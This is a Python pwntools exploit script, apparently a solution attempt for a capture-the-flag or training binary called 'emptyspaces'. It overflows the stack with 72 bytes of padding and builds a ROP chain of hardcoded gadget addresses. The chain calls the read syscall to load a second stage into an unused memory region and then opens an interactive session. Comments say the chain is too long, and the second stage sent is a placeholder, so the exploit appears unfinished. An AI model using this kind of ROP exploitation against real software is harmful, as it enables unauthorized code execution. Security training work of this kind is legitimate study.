import time
from pwn import *

if "REMOTE" not in args:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/rop/4/emptyspaces')
else:
	r = remote("bin.training.jinblack.it", 2015)

code_base=0x400000

gdb.attach(r)
input("wait")


#0x00400190 empty space GNU stuff
emptyspace=0x00400190



#UNFORTUNATELY THIS IS TOO LONG :'(


##chain would be
#0x0000000000481b76: pop rax; pop rdx; pop rbx; ret; 
#0x0        read
#0x50       chars
#0x0        garbage rbx
gadget1=0x00481b76
arg1_1=0x0
arg1_2=0x50
arg1_3=0x0

payload=b"a"*72
payload+=p64(gadget1)
payload+=p64(arg1_1)
payload+=p64(arg1_2)
payload+=p64(arg1_3)



#0x000000000044bd59: pop rdx; pop rsi; ret; 
#0x50  	    chars
#0x00400190 emptyspace
gadget2=0x0044bd59
arg2_1=0x50
arg2_2=0x00400190

payload+=p64(gadget2)
payload+=p64(arg2_1)
payload+=p64(arg2_2)

#0x0000000000402605: pop rdi; pop rbp; ret; 
#0x0 	    stdin
#0x0	    fuck rbp
gadget3=0x00402605
args=0x0
payload+=p64(gadget3)
payload+=p64(args)
payload+=p64(args)

#0x000000000044bd57: syscall; pop rdx; pop rsi; ret; 
#0x00400190 emptyspace
#0x0        don't care
gadget4=0x0044bd57
payload+=p64(gadget4)




#0x00000000004b2cbb: jmp rdx;


r.send(payload)
print("PAYLOAAAAAD HELLOOOOOOO ")
print(len(payload))
input("wait")
r.send(b"doooog")
r.interactive()
